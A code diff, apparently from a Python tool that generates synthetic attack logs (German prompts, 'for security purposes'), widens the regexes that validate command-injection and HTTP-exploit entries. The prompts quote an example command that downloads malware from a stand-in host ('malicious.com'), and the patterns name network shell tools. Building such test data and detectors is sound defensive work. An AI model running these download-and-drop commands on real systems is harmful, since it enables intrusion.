@@ -160,7 +160,7 @@ if __name__ == "__main__":
             "table": "command_injection_logs",
             "prompt": "Generiere realistische Command-Injection-Muster (zu Sicherheitszwecken) wie: 'wget http://malicious.com -O /tmp/malware'",
             # Akzeptiert Befehle und typische Unix-Kommandos
-            "regex": r"(wget|curl|bash|cat|rm|chmod|touch|exec|ls|ps|kill|scp|ssh|nc|echo).*"
+            "regex": r"(?i)(;|\||&&|>|<|wget|curl|bash|sh|rm|chmod|cat|scp|ssh|nc|python|perl|php|exec|system|socat|tftp|telnet|ftp).*"
         },
         {
             "type": "Directory Traversal",
@@ -174,7 +174,7 @@ if __name__ == "__main__":
             "table": "http_method_exploit_logs",
             "prompt": "Generiere realistische HTTP-Exploits (zu Sicherheitszwecken) wie: 'DELETE /important-data HTTP/1.1'",
             # Akzeptiert HTTP-Methoden und URLs
-            "regex": r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|TRACE|CONNECT) .+ HTTP/1\.[01]$"
+            "regex": r"(?i)^(GET|POST|PUT|DELETE|HEAD|OPTIONS|TRACE|CONNECT)\s+\/[^\s]*\s+HTTP\/1\.[01](\r\n.*|\s+.*|$)"
         }
     ]
 
